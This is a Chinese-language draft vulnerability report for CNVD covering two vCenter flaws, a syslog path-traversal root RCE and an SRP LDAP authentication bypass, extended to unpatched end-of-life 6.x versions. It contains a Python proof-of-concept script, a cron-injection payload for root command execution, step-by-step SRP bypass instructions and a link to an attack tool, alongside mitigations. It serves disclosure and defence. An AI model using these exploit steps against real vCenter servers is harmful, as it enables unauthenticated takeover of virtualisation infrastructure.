# CNVD 提交材料

> 使用方法：登录 https://www.cnvd.org.cn → 事件提交 → 按下表逐字段填写。
> 选择"漏洞事件"类型（非原创漏洞，因为 CVE 编号已存在，本报告补充影响范围信息）。

---

## 一、漏洞标题

VMware vCenter Server 6.x 及更早版本受 CVE-2026-59309/CVE-2026-59310 影响（超出 VMSA-2026-0006 通告范围，且无补丁）

## 二、漏洞类型

| 字段 | 值 |
|---|---|
| 漏洞类型 | CVE-2026-59310：CWE-22（路径遍历）→ 任意文件写入 → 远程代码执行 |
| | CVE-2026-59309：CWE-287（认证绕过）→ 任意身份 LDAP 目录接管 |
| 危害等级 | 超危（CVSS 9.8）|
| 是否原创 | 补充发现（CVE 编号已存在，本报告扩展影响版本范围至 EOL 版本）|

## 三、影响产品与版本

| 产品 | 受影响版本 | 补丁状态 |
|---|---|---|
| VMware vCenter Server Appliance 6.0.x | **全部** | **无补丁（EOL）** |
| VMware vCenter Server Appliance 6.5.x | **全部** | **无补丁（EOL）** |
| VMware vCenter Server Appliance 6.7.x | **全部** | **无补丁（EOL）** |
| VMware vCenter Server 7.0.x | < 7.0 Update 3q（推测，未经实测确认）| 联系 Broadcom |
| VMware vCenter Server 8.0.x | < 8.0 U3k / U2f 等 | VMSA-2026-0006.1 |
| VMware vCenter Server 9.0.x | < 9.0.2.0100 | VMSA-2026-0006.1 |
| VMware vCenter Server 9.1.x | < 9.1.0.0300 | VMSA-2026-0006.1 |

> **说明**：VMSA-2026-0006.1 仅列出 7.0–9.1 分支。实测确认 6.x 时代
> appliance（Photon OS 1.0 内核）**同样受两个漏洞影响**——因为底层漏洞
> 组件（rsyslog 路径模板 + Likewise libsrp.so SASL 插件）自 vCenter 6.0
> 起就存在，6.x 版本无官方补丁且**永远不会被修复**。

## 四、漏洞描述

### CVE-2026-59310 — vCenter Syslog 目录遍历导致未授权 root RCE

vCenter Server 内置 rsyslog 服务的动态路径模板将 RFC5424 报文头中的
APP-NAME 和 HOSTNAME 字段**未净化**地拼接进日志落盘路径：

```
$template rsyslogadminLoc, "/var/log/vmware/%app-name%/%app-name%-syslog.log"
```

攻击者向 vCenter 的 syslog 端口（默认 UDP/TCP 514）发送一条 APP-NAME
携带路径遍历序列（`rsyslog/../../../../../etc/cron.d/malicious`）的
RFC5424 报文，利用以下出厂默认配置组合实现任意路径 root 文件写入：

1. 动态路径模板直接拼接 `%app-name%`（目录名 + 文件名双注入点）
2. 选择器 `:app-name, startswith, "rsyslog"` 仅前缀匹配——注入路径可命中
3. `$EscapeControlCharactersOnReceive off` 允许报文 MSG 中的换行穿透落盘

写入 `/etc/cron.d/` 下的计划任务文件（利用换行穿透保证行结构合法），
约 60 秒后 crond 以 **root 权限**执行攻击者命令——实现**无凭据远程代码执行**。

CVSS 3.1 评分：9.8（CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H）

### CVE-2026-59309 — vmdird SRP 认证绕过导致任意身份目录接管

vCenter Server 的 VMware Directory Service（vmdird）使用 Cyrus SASL SRP
插件（libsrp.so）处理 LDAP SASL bind 请求。该实现未按 RFC5054 §3.1 校验
客户端公值 **A ≢ 0 (mod N)**。

攻击者发送 **A = N**（N 为服务端下发的 RFC5054 素数），使服务端计算出
**共享密钥 S = 0**、**会话密钥 K = SHA1(b"")**（公开常量）。由于 M1 =
H(Ng⊕ ‖ H(U) ‖ s ‖ A ‖ B ‖ K ‖ H(I) ‖ H(L)) 的全部输入公开或自选，
攻击者可伪造 M1 通过 SASL bind——以任意**存在**的身份获得 SSO 目录
完整读写权限。

CVSS 3.1 评分：9.8

## 五、复现方法

### CVE-2026-59310 复现

**前置条件**：目标 vCenter 的 syslog 端口（默认 UDP/TCP 514）网络可达，
无需任何凭据。

**步骤**：向目标 514/UDP 端口发送以下 RFC5424 报文（Python 3 构造）：

```python
import socket

target = "x.x.x.x"  # 目标 vCenter IP
payload = (
    "<134>1 2026-01-01T00:00:00Z h "
    "rsyslog/../../../../../tmp/CNVD_PROOF "   # APP-NAME 路径穿越
    "1 ID47 - unauthenticated_write_proof\n"
)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(payload.encode(), (target, 514))
s.close()
```

**预期结果**：目标 vCenter 的 `/tmp/` 目录下出现 `CNVD_PROOF-syslog.log`
文件（root 属主），内容包含 "unauthenticated_write_proof"。
可在目标 vCenter Shell 中通过 `ls -la /tmp/CNVD_PROOF*` 验证。

**进一步利用（RCE）**：将 APP-NAME 中的写入路径改为
`rsyslog/../../../../../etc/cron.d/pwn`，MSG 部分注入换行 + 合法 cron 行：
`\n* * * * * root touch /tmp/rce_confirmed\n#`。
约 60 秒后 crond 以 root 执行该命令，`/tmp/rce_confirmed` 出现即确认 RCE。

### CVE-2026-59309 复现

**前置条件**：目标 vCenter 的 LDAP 端口（TCP 389/636 或 2020）网络可达，
无需任何凭据（需知道一个存在的身份串如 `administrator@vsphere.local`，
该串为 vCenter 出厂默认管理员）。

**步骤**：

1. 向目标 LDAP 端口发起 SASL bind（mechanism = SRP）
2. 收到服务端挑战（N/g/salt/B/L）后，构造 **A = N** 作为客户端公值
3. 计算 K = SHA1(b"")（S=0 由此唯一确定）
4. 伪造 M1 = H(Ng⊕ ‖ H(U) ‖ s ‖ A ‖ B ‖ K ‖ H(I) ‖ H(L)) 发送给服务端
5. 服务端计算 S = (v^u · A)^b mod N = 0 → K = SHA1(b"") → M1 匹配 → **bind 成功**

**预期结果**：以 `administrator@vsphere.local` 身份通过 SASL bind 认证，
获得 SSO 目录读写权限。可通过随后的 LDAP 搜索操作确认（如读取
`cn=Users` 下的用户列表）。

**注**：完整 SRP 协议实现需处理服务端下发的 2048 位素数 N、会话密钥
派生及 SASL 安全层协商。参考实现见
https://github.com/chu0119/vc-strike（`vcstrike/srp59309.py` 模块）。

## 六、补丁状态

| vCenter 版本 | 补丁状态 | 说明 |
|---|---|---|
| 7.0–9.1 | VMSA-2026-0006.1 提供补丁 | 升级至对应修复版本 |
| **6.0 / 6.5 / 6.7** | **无补丁（已 EOL）** | 仅能通过网络隔离缓解 |

**临时缓解措施**（适用于所有版本）：
1. 防火墙限制 syslog 端口（514/1514）仅对受管 ESXi 主机开放
2. rsyslog 输入绑定 pmrfc3164 解析器（关闭 RFC5424 攻击面）
3. omfile 启用 `securepath="normal"` + `secpath-drop="replace"`
4. 设置 `$EscapeControlCharactersOnReceive on`
5. 限制 LDAP 端口（389/636/2020）仅管理网可达

## 七、参考信息

| 项目 | 链接 |
|---|---|
| VMSA-2026-0006.1（厂商通告）| https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/38017 |
| GHSA-v2gp-49gj-2c9f（CVE-2026-59310）| https://github.com/advisories/GHSA-v2gp-49gj-2c9f |
| GHSA-fcv2-9hgc-5mgq（CVE-2026-59309）| https://github.com/advisories/GHSA-fcv2-9hgc-5mgq |
| rsyslog GHSA-xmp9-244p-5ggv | https://github.com/rsyslog/rsyslog/security/advisories/GHSA-xmp9-244p-5ggv |
| 工具仓库（参考实现）| https://github.com/chu0119/vc-strike |

## 八、发现时间与提交信息

- **发现时间**：2026-10-01（授权渗透测试中发现 EOL 版本同样受影响）
- **提交时间**：2026-10-02
- **提交人**：（填写你的 CNVD 账号信息）
- **单位**：（可选填写）
